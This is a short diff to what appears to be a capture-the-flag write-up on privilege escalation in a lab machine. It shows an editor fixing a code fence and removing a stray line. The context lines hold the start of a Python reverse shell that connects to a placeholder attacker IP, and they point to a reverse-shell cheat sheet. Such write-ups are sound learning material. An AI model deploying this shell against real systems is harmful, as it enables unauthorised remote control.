@@ -26,8 +26,6 @@ Looks like we can already read the user flag...
 
 ![user](user.png)
 
-`user
-
 Root
 ------------
 Let's see if we can escalate our privilege using `sudo su`
@@ -38,7 +36,7 @@ No we can't, but we can sudo as scriptmanager as seen in the screenshot.
 
 Grab a python reverse shell from https://highon.coffee/blog/reverse-shell-cheat-sheet/ and we can spawn a reverse shell.
 
-````
+```
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("ATTACKING-IP",80))
